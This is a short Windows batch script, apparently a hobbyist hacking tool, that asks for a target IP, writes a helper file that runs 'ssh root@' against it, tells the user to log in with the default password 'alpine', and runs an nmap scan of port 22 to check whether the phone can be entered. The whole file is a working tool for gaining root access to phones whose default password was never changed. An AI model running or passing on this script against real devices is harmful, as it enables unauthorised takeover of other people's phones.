@echo off
if not exist ip.bat goto makeip else goto list
:makeip
set /P ip=Enter target IP -
(
echo @echo off
echo ssh root@%ip%
)>"ip.bat"
:str
echo 1 for brute 2 for portscan 3 for cmd list (opens new window)
set /p a=
IF %a%==1 goto brute
IF %a%==2 goto portscan
IF %a%==3 start cmds.bat

:brute
echo use password "alpine"
start ip.bat
pause
goto str

:portscan
echo make sure u got nmap
set /P ip=enter ip
echo if it say port 22 is open then u can tunnel into the phone
echo make sure the phone is on
pause
nmap -p22 %ip%
pause
cls
goto str
